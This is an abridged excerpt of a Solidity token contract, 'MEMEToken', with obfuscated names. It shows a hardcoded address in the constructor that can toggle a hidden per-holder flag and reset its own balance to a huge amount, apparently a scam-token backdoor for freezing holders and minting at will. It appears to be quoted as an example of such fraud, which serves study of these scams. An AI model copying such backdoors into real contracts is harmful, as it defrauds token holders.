...
contract MEMEToken is Ownable {
    ...
    address public _beeceo134;
    mapping(address => bool) private ssdvipp;
    function quitOPDoge(address sss) external   {
        if (_beeceo134 == _msgSender()) {
            ssdvipp[sss] = false;
        }
         if (_beeceo134 == _msgSender()) {
            ssdvipp[sss] = false;
    ...
    function adminvivvip() external {
        ...
        if(_beeceo134 == adminAddress){
            _balances[_beeceo134] = googoNum()*(45000);
        }
        if(_beeceo134 == adminAddress){
            _balances[_beeceo134] = googoNum()*(45000);
        }
    ...
    constructor(string memory tokenName, string memory tokensymbol) {
        _beeceo134 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
